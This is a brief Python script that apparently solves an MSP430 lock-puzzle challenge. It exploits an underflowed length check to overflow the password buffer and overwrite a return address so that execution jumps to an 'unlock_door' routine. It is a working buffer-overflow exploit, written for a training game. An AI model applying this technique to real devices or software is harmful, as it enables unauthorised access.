#!/usr/bin/python

import utils
from binascii import hexlify, unhexlify

def ub():
    #0x20 is the max we can get away with
    u = utils.mk_test_hex(0x20*2)
    ub = bytearray(unhexlify(u))
    return ub

def pb(ub=bytearray('')):
    '''
    Right after the "Please enter your password" prompt, it does some dodgy math to
    try to figure out the len argument to getsn for the password:

        45c8:  3e40 1f00      mov       #0x1f, r14
        45cc:  0e8b           sub       r11, r14
        45ce:  3ef0 ff01      and       #0x1ff, r14

    i.e.: 

        r11 == len(ub) == 0x20
        r14 = 0x1f
        r14 -= r11 # whoops! overflow: r14 == 0xffff
        r14 &= 0x1ff # r14 == 0x1ff
    '''
    plen = 0x1f - 0x20 & 0x1ff
    pb = bytearray(unhexlify(utils.mk_test_hex(plen*2)))
    #add the return address for unlock_door
    pb[4:6] = [0x4c, 0x44]
    #password must be zero-terminated at 0x11
    return pb

if __name__ == '__main__':
    print 'username: %s' % hexlify(ub())
    print 'password: %s' % hexlify(pb(ub()))
